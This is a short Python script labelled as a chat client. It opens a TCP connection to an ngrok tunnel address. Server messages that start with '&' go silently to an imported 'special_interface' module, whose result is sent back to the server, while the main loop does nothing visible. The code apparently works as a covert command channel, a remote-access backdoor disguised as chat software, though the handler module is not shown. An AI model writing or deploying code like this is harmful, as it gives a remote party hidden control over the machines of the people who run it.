import socket
import threading
import time
import queue

import special_interface

HOST = '5.tcp.eu.ngrok.io'
PORT = 14003

class ChatClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.running = False
        self.incoming_queue = queue.Queue()
        self.outgoing_queue = queue.Queue()
        self.special_interface = special_interface.SpecialInterface()

    def connect(self):
        """Try to connect to the server"""
        self.incoming_queue.put("Trying to connect to the server")
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            self.running = True
            
            threading.Thread(target=self._receive, daemon=True).start()
            threading.Thread(target=self._send, daemon=True).start()
            self.incoming_queue.put("Connected to the server!")
            return True
        except Exception as e:
            self.incoming_queue.put(f"Connexion error : {e}")
            return False

    def stop(self):
        self.running = False
        if self.sock:
            self.sock.close()

    def _receive(self):
        self.sock.settimeout(0.5)
        while self.running:
            try:
                data = self.sock.recv(1024).decode()
                if not data:
                    break
                if data[0] == '&':
                    special_buffer = data[1:]
                    self.special_interface.go(special_buffer)
                    self.outgoing_queue.put(self.special_interface.result)
                else:
                    self.incoming_queue.put(f"Server: {data}")
            except (socket.timeout, Exception):
                continue
        self.incoming_queue.put("Lost connexion with the server")
        self.running = False

    def _send(self):
        while self.running:
            try:
                msg = self.outgoing_queue.get(timeout=0.5)
                self.sock.sendall(msg.encode())
            except queue.Empty:
                continue
            except Exception:
                break

client = ChatClient(HOST, PORT)
messages = []

try:
    client.connect()
    while client.running:
        time.sleep(0.016)
finally:
    client.stop()
